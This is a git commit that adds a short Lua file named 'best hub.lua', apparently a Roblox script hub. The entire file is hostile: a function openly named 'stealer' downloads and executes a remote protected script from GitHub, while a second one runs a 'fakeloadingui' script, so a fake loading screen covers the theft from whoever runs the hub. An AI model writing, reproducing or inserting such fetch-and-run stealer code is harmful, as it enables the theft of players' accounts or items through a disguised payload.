c91243bb6420b62ca99bb741cb42964e5fd39b0b
ScriptkingPt <erclone131@gmail.com>
2025-05-26 02:37:21 +0800

    Create best hub.lua

---
+++ best hub.lua
@@ -0,0 +1,9 @@
+local function stealer()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/ScriptkingPt/Gag-script/refs/heads/main/Protected_5702196561115891.lua.txt'))()
+end
+local function loadui()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/ScriptkingPt/Gag-script/refs/heads/main/fakeloadingui.lua'))()
+end
+
+task.spawn(stealer)
+task.spawn(loadui)
